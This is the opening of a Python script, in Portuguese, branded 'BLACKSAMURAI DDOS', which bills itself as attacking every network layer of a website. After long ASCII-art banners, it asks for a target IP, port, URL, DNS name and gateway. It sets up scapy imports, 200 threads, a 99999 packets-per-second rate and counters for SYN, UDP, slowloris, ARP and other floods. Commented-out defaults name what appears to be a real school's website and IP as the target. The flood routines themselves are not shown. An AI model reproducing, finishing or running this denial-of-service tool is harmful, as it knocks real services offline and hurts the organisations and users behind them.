# oso_extremo.py

# === Bibliotecas de sistema e utilitários ===
import os
import time
import random
import threading
import socket
import requests
from urllib.parse import urljoin
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandIP, RandShort, fragment,DNS, DNSQR, Ether, ARP, sendp 
from random import randint
from colorama import init, Fore
# ANSI Colors
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"
CYAN = '\033[96m'
import re


# D)

def type_print(text, color=Fore.GREEN, delay=0.01):
    for char in text:
        print(color + char, end="", flush=True)
        time.sleep(delay)
    print()

# ← Primeiro define a função
def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if pattern.match(ip):
        return all(0 <= int(part) <= 255 for part in ip.split('.'))
    return False
    # Agora sim a função de input
def collect_target_info():
    global TARGET_IP, TARGET_PORT, TARGET_URL, DNS_TARGET, GATEWAY_IP

    type_print(r"""
          @         @                          
             @         @                         
         @   @         @   @                     
         @  @@         @@  @                     
         @@ @@@       @@@ @@                     
     @      @@   @@@     @@@   @@      @             
    @@      @@   @@@     @@@   @@      @@            
    @@      @@    @@@@   @@@@    @@      @@           
    @@     @@@    @@@@  @@@@@    @@@     @@@          
    @  @@@    @@@@    @@@@   @@@@    @@@@   @@@@  @       
    @@ @@@@@  @@@@   @@@@@   @@@@@   @@@@  @@@@@ @@       
    @@ @@@@@  @@@@@@@@@@@     @@@@@@@@@@@  @@@@@ @@       
    @@ @@@@@  @@@@@@@@@@@     @@@@@@@@@@@  @@@@@ @@       
    @@@  @@@@   @@@@@@@@@@@@@@@@@@@@@@@@@   @@@@  @@@      
    @@@@  @@@@   @@@@@@@@@@@@@@@@@@@@@@@@@   @@@@  @@@@     
    @@@@   @@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@   @@@@    
    @@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@    
    @@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@    
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
     @@@@@           @@@@@@@@@@@@@@@@@@@           @@@@@     
     @@@@@@             @@@@@@@@@@@@@             @@@@@@     
      @@@@@@@        ..     @@@@@@@@@     ..        @@@@@@   
       @@@@@@@@             @@@@@             @@@@@@@@       
        @@@@@@@@@@           @@@           @@@@@@@@@@        
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@           
              @@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@              
                  @@@@@@@@@@     @@@@@@@@@@                  
                   @@@@@@@@       @@@@@@@@                   
                  @@@@@@@@@       @@@@@@@@@                  
                  @@@@@@@@@ @@@@@ @@@@@@@@@                  
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                 @@@  @@@@@@@@@@@@@@@@@  @@@                 
                  @@  @@@@  @@@@@  @@@@  @@                  
                      @@@@  @@@@@  @@@@                      
    """, Fore.LIGHTRED_EX, 0.0005)

    type_print("ATACAR TODAS AS CAMADAS DE UM SITE 2025", Fore.LIGHTYELLOW_EX, 0.004)

    
    
    type_print("\n⠀⠀⠀⠀⣀⡤⠤⠖⠒⠒⠂⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⢠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⢠⠋⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⢠⡏⠀⡜⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⡄⠈⢇⠀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⣸⠀⢸⠁⠸⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠀⢹⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⡇⠀⡎⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⢀⠞⠀⠀⢈⠆⢸⡇⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⡇⠀⡇⠀⠀⠀⠈⠳⡀⣀⢀⡄⡰⠋⠀⠀⠀⢸⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⢣⠀⢇⠀⠀⠀⠀⠀⠉⡻⢸⠉⠁⠀⠀⠀⠀⠈⡆⢸⠁⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⢸⢠⠈⢆⠀⠀⠀⠀⢀⠇⠀⢦⡀⠀⠀⠀⢀⠞⡰⠸⠀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⢸⠀⣦⠘⢆⣀⡠⠒⢉⣀⣀⡀⠑⠢⢄⣠⠞⣠⠇⢰⠀⠀⠀⠀⠰⣄⡀⠀", Fore.GREEN, 0.002)
    type_print("⠸⡄⠹⣷⣶⣖⡖⣿⣿⣟⣟⡟⣿⣖⣦⣴⣾⡟⠀⡼⠀⠀⠀⠀⠀⢸⡙⡄", Fore.GREEN, 0.002)
    type_print("⠀⠹⡄⣿⣏⠙⢻⢿⠿⣿⡿⡿⠿⡿⠙⢉⣹⠁⡾⠃⠀⠀⠀⠀⠀⢠⡇⣻", Fore.GREEN, 0.002)
    type_print("⠀⠀⠙⣿⣿⣦⢈⡦⠿⠛⠻⢿⡛⠓⢦⣿⢃⡞⠁⠀⠀⠀⠀⣀⡤⠊⢠⠇", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠘⣾⢿⡿⣆⠀⡀⠀⠀⠙⠆⠀⠙⢾⠀⠀⢀⡴⠚⠉⠁⣀⡴⠋⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠘⣎⣳⢛⡇⣾⠓⢦⡀⠀⠀⠀⠈⠓⠖⠋⠀⠀⢠⠞⠁⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠙⡏⢳⣹⠻⣾⣧⢿⢦⡀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠹⣄⠓⠦⠯⠽⠊⣸⠛⠲⠤⠤⠤⠤⠚⠁⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠈⠓⠂⠤⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)

    type_print("⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀", Fore.LIGHTGREEN_EX, 0.01) 
    type_print("⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.LIGHTGREEN_EX, 0.01)

   
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀ ______                            __          ", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀ /_  __/__  ______________     ____/ /___  _____", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀ / / / _ \/ ___/ ___/ __ \   / __  / __ \/ ___/", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀/ / /  __/ /  / /  / /_/ /  / /_/ / /_/ (__  ) ", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀  /_/  \___/_/  /_/   \____/   \__,_/\____/____/  ", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀                   __                                             __  ", Fore.GREEN, 0.002)  
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀      _______  _______/ /____  ____ ___  ____ ______   _      _____  / /_ ", Fore.GREEN, 0.002)
    type_print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀...__ `/ ___/  | | /| / / _ \\/ __ \\', Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀ (__  ) /_/ (__  ) /_/  __/ / / / / / /_/ (__  )   | |/ |/ /  __/ /_/ /", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇/____/\__, /____/\__/\___/_/ /_/ /_/\__,_/____/    |__/|__/\___/_.___/ ", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘", Fore.GREEN, 0.002)
    type_print("⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸", Fore.GREEN, 0.002)
    type_print("⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀", Fore.GREEN, 0.002) 
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀", Fore.GREEN, 0.002)
    type_print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", Fore.GREEN, 0.002)
   
# Banner e frase final
    type_print("═══════════════════════════════════════════════════════════════════════════════════════════════", Fore.LIGHTGREEN_EX, 0.001)
    type_print("██████╗░ ██████╗░ ███╗░░██╗ ██╗  ███╗░░██╗ ███████╗ ████████╗ ██████╗░ ██╗ ██╗░░██╗  ███████╗", Fore.LIGHTGREEN_EX, 0.001)
    type_print("██╔══██╗ ██╔══██╗ ████╗░██║ ██║  ████╗░██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██║ ██║░██╔╝  ██╔════╝", Fore.LIGHTGREEN_EX, 0.001)
    type_print("██████╦  ██║░░██║ ██╔██╗██║ ██║  ██╔██╗██║ ██████╗░ ░░░██║░░░ ██████╦  ██║ █████═╝░  █████╗░░", Fore.LIGHTGREEN_EX, 0.001)
    type_print("██╔══██╗ ██║░░██║ ██║╚████║ ██║  ██║╚████║ ╚════██╗ ░░░██║░░░ ██╔══██╗ ██║ ██╔═██╗░  ██╔══╝░░", Fore.LIGHTGREEN_EX, 0.001)
    type_print("██║░░██║ ██║░░██║ ██║░╚███║ ██║  ██║░╚███║ ██████╔╝ ░░░██║░░░ ██║░░██║ ██║ ██║░╚██╗  ███████╗", Fore.LIGHTGREEN_EX, 0.001)
    type_print("╚═╝░░╚═╝ ╚█████╔╝ ╚═╝░░╚══╝ ╚═╝  ╚═╝░░╚══╝ ╚═════╝░ ░░░╚═╝░░░ ╚═╝░░╚═╝ ╚═╝ ╚═╝░░╚═╝  ╚══════╝", Fore.LIGHTGREEN_EX, 0.001)
    type_print("═════════ BLACKSAMURAI DDOS ░ ATACAR TODAS AS CAMADAS ░ OSL 2025 ═════════════════════════════", Fore.LIGHTYELLOW_EX, 0.002)

    
    type_print("ATACAR TODAS AS CAMADAS DE UM SITE 2025", Fore.LIGHTYELLOW_EX, 0.004)

    # IP
    while True:
        type_print("TARGET_IP:", Fore.CYAN)
        ip = input(Fore.LIGHTGREEN_EX + "ATTACK DDOS DO BLACKSAMURAI TODAS AS CAMADAS  💀2025💀>  ").strip()
        if is_valid_ip(ip):
            TARGET_IP = ip
            break
        print(Fore.RED + "❌ IP inválido. Tente novamente.")

    # Porta
    while True:
        type_print("TARGET_PORT:", Fore.CYAN)
        port_input = input(Fore.LIGHTGREEN_EX + "> ").strip()
        if port_input.isdigit() and 1 <= int(port_input) <= 65535:
            TARGET_PORT = int(port_input)
            break
        print(Fore.RED + "❌ Porta inválida. Use um número entre 1 e 65535.")

    # URL
    while True:
        type_print("TARGET_URL:", Fore.CYAN)
        url = input(Fore.LIGHTGREEN_EX + "> ").strip()
        if url:
            TARGET_URL = url
            break
        print(Fore.RED + "❌ URL não pode ser vazia.")

    # DNS
    while True:
        type_print("DNS_TARGET:", Fore.CYAN)
        dns = input(Fore.LIGHTGREEN_EX + "> ").strip()
        if dns:
            DNS_TARGET = dns
            break
        print(Fore.RED + "❌ DNS não pode ser vazio.")

    # Gateway
    while True:
        type_print("GATEWAY_IP:", Fore.CYAN)
        gateway = input(Fore.LIGHTGREEN_EX + "> ").strip()
        if is_valid_ip(gateway):
            GATEWAY_IP = gateway
            break
        print(Fore.RED + "❌ Gateway IP inválido.")

    type_print("\nATTACK SENDO INICIADO DDOS ATTACK TODAS AS CAMADAS OSL.\n", Fore.RED)
    time.sleep(0.5)

    type_print("--- TARGET CONFIGURATION ---", Fore.YELLOW)
    type_print(f"TARGET_IP     = \"{TARGET_IP}\"", Fore.GREEN)
    type_print(f"TARGET_PORT   = {TARGET_PORT}", Fore.GREEN)
    type_print(f"TARGET_URL    = \"{TARGET_URL}\"", Fore.GREEN)
    type_print(f"DNS_TARGET    = \"{DNS_TARGET}\"", Fore.GREEN)
    type_print(f"GATEWAY_IP    = \"{GATEWAY_IP}\"  # para ataque ARP (camada 2)\n", Fore.GREEN)

    return {
        "TARGET_IP": TARGET_IP,
        "TARGET_PORT": TARGET_PORT,
        "TARGET_URL": TARGET_URL,
        "DNS_TARGET": DNS_TARGET,
        "GATEWAY_IP": GATEWAY_IP
    }


#TARGET_IP = "187.45.240.104"
#TARGET_PORT = 443
#TARGET_URL = "http://colegiodorigon.com.br/"
#DNS_TARGET = "colegiodorigon.com.br"
#GATEWAY_IP = "187.45.240.1"  # para ataque ARP (camada 2)
PACKETS_PER_SECOND = 99999
THREADS = 200 
running = True
 # ou outro valor desejado
# Estatísticas
stats = {
    "icmp": 0, "syn": 0, "udp": 0, "http": 0, "dns": 0,
    "slowloris": 0, "rst": 0, "xmas": 0, "ack": 0, "frag": 0,
    "fails": 0, "arp": 0, "tls": 0
}
#Attack Exploits

wordlist_path =    "Web-Content/directory-list-2.3-big.txt"

# Ler wordlist com tratamento de erros e comentários
